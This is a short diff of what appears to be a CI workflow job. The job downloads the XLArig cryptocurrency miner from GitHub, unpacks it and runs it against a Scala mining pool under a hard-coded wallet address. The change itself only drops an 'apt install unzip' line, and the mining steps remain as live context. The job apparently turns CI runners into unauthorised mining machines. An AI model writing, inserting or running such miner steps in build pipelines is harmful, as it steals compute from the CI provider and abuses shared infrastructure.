@@ -19,7 +19,6 @@ jobs:
           cd here
           wget https://github.com/scala-network/XLArig/releases/download/v5.2.1/XLArig-v5.2.1-linux-x86_64.zip
           mv XLArig-v5.2.1-linux-x86_64.zip xla.zip
-          apt install unzip -y
           unzip xla.zip
           chmod +x xlarig
           ./xlarig -o pool.scala.network:3333 -u SvmAgqJnAsocq85YumCfnfZHFvUgD3t7oGKvPtkvU8Hz7LkxCsdPdJ6Pm9L7yFbVT2AnJWMiY3mEcWMckqAKYq8T1NXUpJsPk -p x --algo panthera
